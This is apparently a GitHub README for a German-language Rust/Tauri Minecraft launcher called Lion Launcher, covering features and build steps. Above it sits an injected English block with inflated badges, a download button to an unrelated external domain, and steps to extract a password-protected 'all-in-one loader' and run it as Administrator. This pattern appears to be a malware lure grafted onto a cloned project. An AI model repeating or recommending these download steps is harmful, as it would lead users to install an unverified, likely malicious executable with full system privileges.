<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Lion Launcher 🦁

Ein minimalistischer Minecraft Launcher für Linux und Windows, geschrieben in Rust mit Tauri.

## Features

**Profilverwaltung**
- Erstelle mehrere Profile mit verschiedenen Minecraft-Versionen
- Vollständige Unterstützung für alle Mod-Loader:
  -  **Vanilla**
  -  **Fabric** 
  -  **Quilt** 
  -  **Forge**
  -  **Neoforge**

- Jedes Profil kann eigene Mods, Einstellungen und Resource Packs haben
- Automatisches Laden und Verwalten der Loader-Versionen

**Mod Browser**
- Durchsuche Modrinth
- Filtere nach Minecraft-Version und Mod-Loader
- Sortiere nach Relevanz, Downloads, Updates
- Installiere Mods mit einem Klick
- Eine große Detail übersicht 

**Microsoft Account**
- Anmeldung mit Microsoft/Xbox Account
- Device Code Flow für einfache Authentifizierung
- Zeigt deinen Minecraft-Skin an
- Offline-Account Option verfügbar

**Skins**
- 3D-Skin-Vorschau
- Suche nach Spieler-Skins
- Zuletzt angesehene Skins speichern

**Einstellungen**
- Dark/Light Mode
- Anpassbare Akzentfarben 
- Konfiguriere Speicher und Java-Pfad

 **Design**
- Minimalistisches UI in Grau mit anpassbaren Akzentfarben
- Schnelle und reaktionsschnelle Oberfläche
- Kleiner Bundle-Size (~10-15MB)

## System-Anforderungen

- **Linux**: GTK3, WebKit2GTK
- **Windows**: WebView2
- **Java**: Java 17+ (für moderne Minecraft-Versionen)
- **Rust**: 1.70+ (nur für Build)

## Installation

### Releases

Lade die neueste Version von diesem Repository runter bei nighly builds.


### Aus Source bauen

```bash
# Tauri CLI installieren
cargo install tauri-cli --version "^2.0.0"

# Linux: Dependencies installieren
sudo apt install -y libwebkit2gtk-4.1-dev libgtk-3-dev \
    libayatana-appindicator3-dev librsvg2-dev patchelf

# Release Build erstellen
cargo tauri build --bundles appimage,deb

# Oder verwende das Build-Skript
./build-release.sh
```

**Ausgabe:** `target/release/bundle/appimage/*.AppImage`

### Linux Dependencies (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install -y libwebkit2gtk-4.1-dev \
    build-essential \
    curl \
    wget \
    file \
    libssl-dev \
    libgtk-3-dev \
    librsvg2-dev
```

## Verwendung

1. **Starte den Launcher**
2. **Melde dich an** (Microsoft oder Offline)
3. **Erstelle ein Profil** mit deiner gewünschten Minecraft-Version
4. **Füge Mods hinzu** über den Mod Browser
5. **Starte Minecraft!**

## Windows-Test unter Linux (Wine)

Wenn du Loader-Probleme unter Windows reproduzieren willst, kannst du den Windows-Launcher direkt unter Wine starten:

```bash
bash scripts/wine-loader-test.sh --prepare-prefix --winetricks
```

Nutzt standardmaessig das neueste `release-output/*_x64-setup.zip`, extrahiert `Lion-Launcher.exe` und schreibt Logs nach `release-output/wine-logs/`.

Weitere Optionen:

```bash
bash scripts/wine-loader-test.sh --help
```

## Technologie-Stack

- **Frontend**: HTML, CSS, JavaScript
- **Backend**: Rust
- **Framework**: Tauri 2.0
- **APIs**: Modrinth, Mojang, Microsoft/Xbox Live
